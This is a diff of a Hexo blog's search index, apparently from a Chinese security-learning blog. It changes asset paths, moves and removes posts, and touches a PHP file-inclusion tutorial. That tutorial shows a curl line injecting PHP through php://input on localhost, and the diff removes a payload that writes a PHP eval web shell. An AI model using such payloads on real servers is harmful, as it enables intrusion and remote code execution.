@@ -658,7 +658,7 @@
   <entry>
     <title>域内信息收集</title>
     <url>/2020/07/25/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域内信息收集</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域内信息收集</p>
 <p>PS：这篇文章很长！是前辈ms08067团队出的书《内网安全攻防》里的内容（很不错），我都一一复现了一遍并做了笔记，请耐心观看。以后会有第三章，第四章…的笔记，佛系更新吧~</p>
 <p>2.1 内网信息搜集概述<br>当渗透测试人员进入内网后，面对的是一片“黑暗森林”，所以渗透测试人员首先会对当前所处的网络环境进行判断，通常的判断分为三种。</p>
 <p>我是谁？——对机器角色的判断。</p>
@@ -965,16 +965,34 @@
   <entry>
     <title>回归</title>
     <url>/2020/06/26/%E5%9B%9E%E5%BD%92/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>考完试了，正式回归！！！！！！！！！</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>考完试了，正式回归！！！！！！！！！</p>
 ]]></content>
       <tags>
         <tag>日常</tag>
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2020/06/26/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>倒计时</title>
     <url>/2020/06/08/%E5%80%92%E8%AE%A1%E6%97%B6/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="13天"><a href="#13天" class="headerlink" title="13天"></a><strong>13天</strong></h1>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="13天"><a href="#13天" class="headerlink" title="13天"></a><strong>13天</strong></h1>]]></content>
       <tags>
         <tag>学业</tag>
       </tags>
@@ -3018,7 +3036,7 @@ eval($a['t'].$ab);
 <p>也可以使用<code>burpsuite</code>或<code>curl</code>进行利用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;FI&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;input&quot; -d &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">Getshell</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[Qftm])?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">&lt;?PHP                                                        ?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><strong>file_get_contents()的利用</strong></p>
 <p><code>file_get_contents()</code>函数将整个文件读入一个字符串中</p>
@@ -3481,41 +3499,6 @@ eval($a['t'].$ab);
       <categories>
         <category>English</category>
         <category>音标</category>
-      </categories>
-      <tags>
-        <tag>English</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>英语连读规则</title>
-    <url>/2020/05/09/%E8%8B%B1%E8%AF%AD%E8%BF%9E%E8%AF%BB%E8%A7%84%E5%88%99/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、-以辅音结尾的单词-h开头的单词h不发音，与前面的辅音连读"><a href="#1、-以辅音结尾的单词-h开头的单词h不发音，与前面的辅音连读" class="headerlink" title="1、 以辅音结尾的单词+h开头的单词h不发音，与前面的辅音连读"></a>1、 以辅音结尾的单词+h开头的单词h不发音，与前面的辅音连读</h1><p>　　如：What wil(l he) [wili]do?</p>
-<p>　　Ha(s he) done it before?</p>
-<p>　　Mus(t he) [ti] go?</p>
-<p>　　Tell him to ask her lea(ve him) [vim].</p>
-<h1 id="2、以辅音结尾的单词-元音开头的单词"><a href="#2、以辅音结尾的单词-元音开头的单词" class="headerlink" title="2、以辅音结尾的单词+元音开头的单词"></a>2、以辅音结尾的单词+元音开头的单词</h1><p>　　如：(1)I’d li(ke a)nother bow(l o)f rice. 这里like/laik / 以辅音结尾，another 以元音开头，所以连读;</p>
-<p>　　(2)We have an English friend. 这个句子有两处连读：前一处是have的尾辅音/v/与an的开头元音//连读为/v/;后一处是an的尾辅音/n/与English的开头音素/i/连读为/ni/</p>
-<p>　　注意：以辅音结尾指的是音标中的最后一个音是辅音，而不是单词最后一个字母是辅音字母，这如同u[ju:]niversity前面的定冠词必须用a一样。</p>
-<h1 id="3、“辅音-半元音”型连读"><a href="#3、“辅音-半元音”型连读" class="headerlink" title="3、“辅音+半元音”型连读"></a>3、“辅音+半元音”型连读</h1><p>　　英语语音中的/j/和/w/是半元音，如果前一个词是以辅音结尾，后一个词是以半元音，特别是/j/开头，此时也要连读。</p>
-<p>　　如：Thank you. Nice to meet you. Did you get there late again?Would you like a cup of tea? Could you help me, please?</p>
-<h1 id="4、以-r或-re字母结尾的单词-元音开头的单词时，可将-r-与后面的元音拼读。"><a href="#4、以-r或-re字母结尾的单词-元音开头的单词时，可将-r-与后面的元音拼读。" class="headerlink" title="4、以-r或-re字母结尾的单词+元音开头的单词时，可将/r/与后面的元音拼读。"></a>4、以-r或-re字母结尾的单词+元音开头的单词时，可将/r/与后面的元音拼读。</h1><p>　　如：They looked for it here and there.这个句子也有两处连读：前一处是for it合读为/frit/，后一处是here and合读为/hirænd/。</p>
-<p>　　注意：如果一个音节的前后都有字母r，即使后面的词以元音开头，也不能连读。 The black clouds are coming nearer and nearer.(nearer与and不可连读)</p>
-<h1 id="5、“元音-元音”型连读"><a href="#5、“元音-元音”型连读" class="headerlink" title="5、“元音+元音”型连读"></a>5、“元音+元音”型连读</h1><p>　　如果前一个词以元音结尾，后一个词以元音开头，这两个音往往也要自然而不间断地连读到一起。</p>
-<p>　　如：I am Chinese.</p>
-<p>　　He is very friendly to me.</p>
-<p>　　She wants to study English.</p>
-<p>　　How and why did you come here?</p>
-<p>　　She can’t carry it.</p>
-<p>　　It’ll take you three hours to walk there.</p>
-<p>　　The question is too easy for him to answer.</p>
-<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>连读现象只出现在意群(所谓意群是指句子中按意思和结构划分出的各个部分，每一部分即称为一个意群)内部，意群与意群之间的两个相邻单词即使符合上面所讲的两个条件，也不连读。</p>
-<p>　　如：I hope it’ll get a little warmer. 这个句子中的hope it就不连读为/hupit/，因为主句I hope是一个意群，后面的从句是另一个意群。</p>
-<p>　　以上就是整理的关于英语句子连读规则，希望对大家有所帮助。英语句子连读规则虽然大家现在都知道了，但是并不代表你们就会句子连读了。英语句子连读不能为了连读而连读，而是建立在别人能够理解的条件上。而且，英语句子连读规则要真正应用到实际，需要大家通过大量的口头练习才能掌握。</p>
-]]></content>
-      <categories>
-        <category>English</category>
-        <category>听力</category>
-        <category>口语</category>
       </categories>
       <tags>
         <tag>English</tag>
@@ -5740,23 +5723,5 @@ secure_file_priv没有设置时，则表示没有任何限制</code></pre><h3 id
         <tag>日常相关</tag>
         <tag>wexin</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/1970/01/01/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
   </entry>
 </search>
